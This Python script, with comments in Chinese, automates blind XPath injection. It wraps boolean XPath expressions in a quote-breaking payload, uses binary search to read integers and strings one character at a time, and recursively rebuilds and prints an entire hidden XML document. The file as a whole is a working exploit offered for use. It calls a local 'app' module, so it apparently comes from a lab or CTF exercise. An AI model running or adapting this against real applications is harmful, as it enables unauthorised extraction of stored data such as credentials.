#!/usr/bin/python3

import requests
import json
import sys
import time
from urllib.parse import quote, urlencode
import app
import hashlib

class XMLnode():
    def __init__(self, name, depth):
        self.name = name # 节点名
        self.depth = depth # 深度

    def __str__(self):
        indent = " " * self.depth * 2 # 按照深度调整缩进

        # 获取节点名
        info = f'\n{indent}name: {self.name}'

        i = 1 # 获取属性节点
        while hasattr(self, f'a{i}'):
            AttrName = getattr(self, f'a{i}')['key']
            AttrValue = getattr(self, f'a{i}')['value']
            info += f', {AttrName}: {AttrValue}'
            i = i + 1

        # 获取文本节点
        info += f', text: {self.text}' if hasattr(self, 'text') else ''

        i = 1 # 获取子节点
        while hasattr(self,f'{i}'):
            child = (getattr(self, f'{i}')) # 进入下一层
            info += str(child)
            i = i + 1
        return info

# 预言机
def oracle(expression):
    return app.query(f"nonexist' or {expression} and '1'='1")

# 二分法获取整数值
def BisectionGetInteger(target):
    low = 0
    high = 50
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{target}>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

# 二分法获取字符串
def BisectionGetString(target):
    length = BisectionGetInteger(f'string-length({target})') # 先探测字符串长度
    #print(f'-| [BINARY SEARCH] Length: {length} | Result: ', end='')
    sys.stdout.flush()
    if length == 0: # 字符串为空直接返回
        return ""

    alphabets = "~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.-:"
    string = ""
    for i in range(1, length + 1):
        low = 0
        high = len(alphabets) - 1
        while low < high:
            mid = (low + high) // 2
            expression = f'string-length(substring-before("{alphabets}", substring({target},{i},1)))>{mid}'
            if oracle(expression):
                low = mid + 1
            else:
                high = mid
        if low == 0: # 字符不在字符表内
            string += "?" # 未知字符
            #print(f'?', end='')
            #sys.stdout.flush()
        else: # 字符在字符表内
            string += alphabets[low]
            #print(f'{alphabets[low]}', end='')
            #sys.stdout.flush()
    #print("")
    return string

# 递归还原XML树状结构
def RecurselyBuildStructure(objNode, path, depth):
    node = path[:-1] # 去掉路径末尾的/

    # 获取属性节点
    if oracle(f"count({node}/@*)>0"): # 如果存在属性节点...
        AttrCount = BisectionGetInteger(f"count({node}/@*)")
        #print(f'[递归扫描 发现{node}有{AttrCount}个属性节点')
        for i in range(1, AttrCount + 1): # 逐个枚举属性节点
            AttrPath = f"{node}/@*[{i}]"
            AttrName = BisectionGetString(f"name({AttrPath})")
            AttrValue = BisectionGetString(AttrPath)
            setattr(objNode, f'a{i}', {'key':AttrName, 'value':AttrValue}) # 设置节点对象属性

    # Tips: 这里先判断是否有子节点 再获取数量 而不是先获取数量 再判断数量是否等于0
    # 因为末端节点很多 二分获取数量需要发送多个请求 而调用预言机只发送一个请求
    # 能省很多时间 特别是时间盲注时
    if oracle(f"count({path}*)=0"): # 如果没有子节点 当前节点可能是个文本节点
        text = BisectionGetString(node) # 去掉路径最后的/
        setattr(objNode, "text", text) # 将node的text属性设为{text}
        #print(f'[递归扫描] {path}没有子节点')
        return
    ChildCount = BisectionGetInteger(f'count({path}*)') # 获取子节点数量
    #print(f'[递归扫描] 发现{path}有{ChildCount}个子节点')

    for i in range(1, ChildCount + 1): # 逐个枚举子节点
        NextElement = f'{path}*[{i}]' # 拼接节点路径
        Elementname = BisectionGetString(f'name({NextElement})') # 获取节点名
        child = XMLnode(Elementname, depth + 1)
        setattr(objNode, str(i), child)
        NextPath = f'{NextElement}/' # 拼接路径
        #print(f'[递归扫描] 进入{NextPath} | 节点名{Elementname}')
        RecurselyBuildStructure(getattr(objNode, str(i)) , NextPath, depth + 1) # 递归进入子节点
    return

tree = XMLnode(BisectionGetString(f'name(/*)'), 0)
path = '/' # 根节点作为递归起点
RecurselyBuildStructure(tree, path, 0)
print(tree)
